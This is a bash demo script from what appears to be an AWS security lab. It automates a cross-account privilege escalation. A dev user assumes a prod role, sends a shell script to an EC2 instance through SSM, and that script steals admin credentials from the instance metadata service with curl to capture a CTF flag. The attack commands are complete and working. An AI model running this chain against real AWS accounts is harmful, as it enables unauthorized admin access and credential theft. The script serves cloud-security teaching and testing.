#!/bin/bash
set -e

# Demo script for ssm-startsession-ec2-admin cross-account privilege escalation
# This scenario demonstrates how a dev account user can assume a prod pivot role,
# use ssm:SendCommand to execute a shell script on an EC2 instance with an admin
# instance profile, retrieve admin credentials via IMDS, and capture a CTF flag.
#
# Attack path:
#   pl-dev-ssm-ec2-starting-user (dev)
#   -> [sts:AssumeRole cross-account]
#   -> pl-prod-ssm-ec2-pivot-role (prod)
#   -> [ssm:SendCommand with AWS-RunShellScript]
#   -> pl-prod-ssm-ec2-instance (EC2 with admin instance profile)
#   -> [IMDS credential retrieval]
#   -> pl-prod-ssm-ec2-admin-role (admin)
#   -> [ssm:GetParameter]
#   -> CTF flag

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-dev-ssm-ec2-starting-user"
PROD_PIVOT_ROLE_NAME="pl-prod-ssm-ec2-pivot-role"
EC2_ADMIN_ROLE_NAME="pl-prod-ssm-ec2-admin-role"
FLAG_PARAM_NAME="/pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SSM SendCommand EC2 Admin Cross-Account Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"

cd "$TERRAFORM_ROOT"

# Get the grouped module output for scenario-specific fields (creds + ARNs)
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.cross_account_dev_to_prod_multi_hop_ssm_startsession_ec2_admin.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output for this scenario${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

DEV_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
DEV_SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
EC2_INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_instance_id')
PROD_PIVOT_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.prod_pivot_role_arn')

if [ -z "$DEV_ACCESS_KEY" ] || [ "$DEV_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not extract starting_user_access_key_id from terraform output${NC}"
    exit 1
fi

if [ "$EC2_INSTANCE_ID" == "null" ] || [ -z "$EC2_INSTANCE_ID" ]; then
    echo -e "${RED}Error: Could not extract ec2_instance_id from terraform output${NC}"
    exit 1
fi

if [ "$PROD_PIVOT_ROLE_ARN" == "null" ] || [ -z "$PROD_PIVOT_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract prod_pivot_role_arn from terraform output${NC}"
    exit 1
fi

# Get readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${DEV_ACCESS_KEY:0:10}..."
echo "EC2 Instance ID: $EC2_INSTANCE_ID"
echo "Prod Pivot Role ARN: $PROD_PIVOT_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd "$SCRIPT_DIR"

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$DEV_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$DEV_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure and verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with dev starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

show_cmd "Attacker (dev)" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! "$CURRENT_IDENTITY" == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Expected identity to contain: $STARTING_USER"
    exit 1
fi
echo -e "${GREEN}✓ Verified dev starting user identity${NC}\n"

# [EXPLOIT] Step 3: Cross-account AssumeRole into the prod pivot role
echo -e "${YELLOW}Step 3: Assuming prod pivot role cross-account (sts:AssumeRole)${NC}"
echo "Target role: $PROD_PIVOT_ROLE_ARN"

show_attack_cmd "Attacker (dev)" "aws sts assume-role --role-arn \"$PROD_PIVOT_ROLE_ARN\" --role-session-name exploit-ssm-ec2 --query 'Credentials' --output json"
ASSUME=$(aws sts assume-role \
    --role-arn "$PROD_PIVOT_ROLE_ARN" \
    --role-session-name exploit-ssm-ec2 \
    --output json 2>/dev/null)

if [ $? -ne 0 ] || [ -z "$ASSUME" ]; then
    echo -e "${RED}Error: Failed to assume prod pivot role${NC}"
    exit 1
fi

export AWS_ACCESS_KEY_ID=$(echo "$ASSUME" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME" | jq -r '.Credentials.SessionToken')
export AWS_REGION=$AWS_REGION

show_cmd "Attacker (prod pivot)" "aws sts get-caller-identity --query 'Arn' --output text"
PIVOT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null)
echo "Current identity: $PIVOT_IDENTITY"

if [[ ! "$PIVOT_IDENTITY" == *"$PROD_PIVOT_ROLE_NAME"* ]]; then
    echo -e "${RED}Error: Failed to verify prod pivot role assumption${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully assumed prod pivot role cross-account${NC}\n"

# Capture pivot role credentials so we can restore them after observation steps
PIVOT_KEY_ID=$(echo "$ASSUME" | jq -r '.Credentials.AccessKeyId')
PIVOT_SECRET=$(echo "$ASSUME" | jq -r '.Credentials.SecretAccessKey')
PIVOT_TOKEN=$(echo "$ASSUME" | jq -r '.Credentials.SessionToken')

use_pivot_creds() {
    export AWS_ACCESS_KEY_ID="$PIVOT_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$PIVOT_SECRET"
    export AWS_SESSION_TOKEN="$PIVOT_TOKEN"
}

# Wait for credentials to propagate
echo -e "${YELLOW}Waiting 15 seconds for credentials to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Credentials propagated${NC}\n"

# [OBSERVATION] Step 4: Enumerate EC2 instance details
echo -e "${YELLOW}Step 4: Enumerating EC2 instance details${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION

show_cmd "ReadOnly" "aws ec2 describe-instances --instance-ids \"$EC2_INSTANCE_ID\" --region $AWS_REGION --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output table"
aws ec2 describe-instances \
    --instance-ids "$EC2_INSTANCE_ID" \
    --region "$AWS_REGION" \
    --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' \
    --output table 2>/dev/null || true
echo -e "${GREEN}✓ Enumerated target EC2 instance${NC}\n"

# [OBSERVATION] Step 5: Wait for SSM agent to report the instance as Online
echo -e "${YELLOW}Step 5: Polling SSM until instance is Online (up to 3 minutes)${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION

SSM_ONLINE=0
for i in $(seq 1 12); do
    PING_STATUS=$(aws ssm describe-instance-information \
        --filters "Key=InstanceIds,Values=$EC2_INSTANCE_ID" \
        --region "$AWS_REGION" \
        --query 'InstanceInformationList[0].PingStatus' \
        --output text 2>/dev/null || echo "")

    echo "  Attempt $i/12: SSM PingStatus = ${PING_STATUS:-<no response>}"

    if [ "$PING_STATUS" = "Online" ]; then
        SSM_ONLINE=1
        break
    fi

    if [ "$i" -lt 12 ]; then
        sleep 15
    fi
done

if [ "$SSM_ONLINE" -ne 1 ]; then
    echo -e "${RED}Error: EC2 instance did not become SSM Online within 3 minutes${NC}"
    echo "The SSM agent may still be initializing. Try running the demo again in a few minutes."
    exit 1
fi
echo -e "${GREEN}✓ EC2 instance is SSM Online — ready for command execution${NC}\n"

# [EXPLOIT] Step 6: Send shell command to the instance to retrieve IMDS credentials and capture the flag
echo -e "${YELLOW}Step 6: Sending shell command via ssm:SendCommand to retrieve admin creds from IMDS and capture flag${NC}"
echo "The pivot role has ssm:SendCommand on the instance."
echo "The instance carries an admin IAM instance profile (pl-prod-ssm-ec2-admin-role)."
echo "We will retrieve temporary credentials from IMDS inside the instance and call ssm:GetParameter."

use_pivot_creds
export AWS_REGION=$AWS_REGION

# Build the shell script that runs on the instance:
# 1. Retrieve IMDSv2 token
# 2. Discover the attached IAM role name from IMDS
# 3. Pull temporary credentials for that role
# 4. Export them and call sts:GetCallerIdentity to prove the identity
# 5. Read the CTF flag from SSM Parameter Store
INSTANCE_SCRIPT='TOKEN=$(curl -sf -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); echo "[*] EC2 instance role: $ROLE"; CREDS=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"); export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)[\"AccessKeyId\"])"); export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)[\"SecretAccessKey\"])"); export AWS_SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)[\"Token\"])"); echo "[*] Caller identity as EC2 role:"; aws sts get-caller-identity --region '"$AWS_REGION"'; FLAG=$(aws ssm get-parameter --name /pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin --query Parameter.Value --output text --region '"$AWS_REGION"'); echo "FLAG: $FLAG"'

show_attack_cmd "Attacker (prod pivot)" "aws ssm send-command --instance-ids \"$EC2_INSTANCE_ID\" --document-name AWS-RunShellScript --parameters 'commands=[\"<imds-cred-retrieval-and-flag-read>\"]' --region $AWS_REGION --query 'Command.CommandId' --output text"

# Build the send-command JSON payload with jq so embedded double quotes in
# INSTANCE_SCRIPT (curl -H "...", python3 -c "...\"AccessKeyId\"...") are
# escaped correctly. Passing the script via --parameters 'commands=[...]'
# directly on the command line breaks because the AWS CLI tries to re-parse
# the embedded quotes and fails with "Invalid JSON" before the API is called.
SEND_CMD_JSON=$(jq -n \
    --arg doc "AWS-RunShellScript" \
    --arg instance "$EC2_INSTANCE_ID" \
    --arg script "$INSTANCE_SCRIPT" \
    '{
        DocumentName: $doc,
        InstanceIds: [$instance],
        Parameters: { commands: [$script] }
    }')

SEND_OUTPUT=$(aws ssm send-command \
    --cli-input-json "$SEND_CMD_JSON" \
    --region "$AWS_REGION" \
    --output json 2>&1)
SEND_EXIT=$?

if [ $SEND_EXIT -ne 0 ]; then
    echo -e "${RED}Error: ssm:SendCommand failed (exit $SEND_EXIT)${NC}"
    echo "$SEND_OUTPUT"
    exit 1
fi

COMMAND_ID=$(echo "$SEND_OUTPUT" | jq -r '.Command.CommandId')

if [ -z "$COMMAND_ID" ] || [ "$COMMAND_ID" = "None" ] || [ "$COMMAND_ID" = "null" ]; then
    echo -e "${RED}Error: ssm:SendCommand returned no command ID${NC}"
    echo "$SEND_OUTPUT"
    exit 1
fi

echo "Command ID: $COMMAND_ID"
echo -e "${GREEN}✓ Command sent to EC2 instance${NC}\n"

# [OBSERVATION] Step 7: Poll for command completion
echo -e "${YELLOW}Step 7: Polling for command completion (up to 100 seconds)${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION

COMMAND_STATUS=""
for i in $(seq 1 20); do
    COMMAND_STATUS=$(aws ssm get-command-invocation \
        --command-id "$COMMAND_ID" \
        --instance-id "$EC2_INSTANCE_ID" \
        --region "$AWS_REGION" \
        --query 'Status' \
        --output text 2>/dev/null || echo "")

    echo "  Attempt $i/20: Status = ${COMMAND_STATUS:-<pending>}"

    if [ "$COMMAND_STATUS" = "Success" ] || [ "$COMMAND_STATUS" = "Failed" ] || [ "$COMMAND_STATUS" = "TimedOut" ] || [ "$COMMAND_STATUS" = "Cancelled" ]; then
        break
    fi

    sleep 5
done

if [ "$COMMAND_STATUS" != "Success" ]; then
    echo -e "${RED}Error: Command did not complete successfully (final status: ${COMMAND_STATUS:-unknown})${NC}"
    # Print error output if available
    aws ssm get-command-invocation \
        --command-id "$COMMAND_ID" \
        --instance-id "$EC2_INSTANCE_ID" \
        --region "$AWS_REGION" \
        --query 'StandardErrorContent' \
        --output text 2>/dev/null || true
    exit 1
fi

echo -e "${GREEN}✓ Command completed successfully${NC}\n"

# [OBSERVATION] Step 8: Retrieve command output
echo -e "${YELLOW}Step 8: Retrieving command output from SSM${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION

show_cmd "ReadOnly" "aws ssm get-command-invocation --command-id \"$COMMAND_ID\" --instance-id \"$EC2_INSTANCE_ID\" --region $AWS_REGION --query 'StandardOutputContent' --output text"
COMMAND_OUTPUT=$(aws ssm get-command-invocation \
    --command-id "$COMMAND_ID" \
    --instance-id "$EC2_INSTANCE_ID" \
    --region "$AWS_REGION" \
    --query 'StandardOutputContent' \
    --output text 2>/dev/null)

echo ""
echo -e "${BLUE}--- Instance command output ---${NC}"
echo "$COMMAND_OUTPUT"
echo -e "${BLUE}--- End of output ---${NC}"
echo ""

# [EXPLOIT] Step 9: Extract the CTF flag from the command output
# The flag was retrieved by the EC2 instance's admin role via IMDS credentials.
# It ran as pl-prod-ssm-ec2-admin-role — never external admin credentials.
echo -e "${YELLOW}Step 9: Extracting CTF flag from instance output${NC}"

FLAG_VALUE=$(echo "$COMMAND_OUTPUT" | grep '^FLAG:' | sed 's/^FLAG: //')

if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "None" ]; then
    echo -e "${RED}Error: Could not extract flag from command output${NC}"
    echo "Expected a line starting with 'FLAG:' in the instance output."
    echo "Check that the EC2 instance's admin role has ssm:GetParameter on the flag parameter."
    exit 1
fi

echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}\n"

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (dev account)"
echo "2. Assumed prod pivot role cross-account: $PROD_PIVOT_ROLE_ARN"
echo "3. Sent AWS-RunShellScript command to EC2 instance: $EC2_INSTANCE_ID"
echo "4. Instance retrieved IMDSv2 credentials for role: $EC2_ADMIN_ROLE_NAME"
echo "5. Instance read CTF flag from SSM Parameter Store using admin role"
echo "6. Flag extracted from command output: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  pl-dev-ssm-ec2-starting-user"
echo "    → (sts:AssumeRole cross-account)"
echo "    → pl-prod-ssm-ec2-pivot-role"
echo "    → (ssm:SendCommand AWS-RunShellScript)"
echo "    → pl-prod-ssm-ec2-instance (EC2 with admin instance profile)"
echo "    → (IMDS credential retrieval)"
echo "    → pl-prod-ssm-ec2-admin-role"
echo "    → (ssm:GetParameter)"
echo "    → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- SSM RunCommand invocation: $COMMAND_ID (read-only, no persistent changes)"
echo "- No IAM mutations or persistent resources created"

echo -e "\n${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
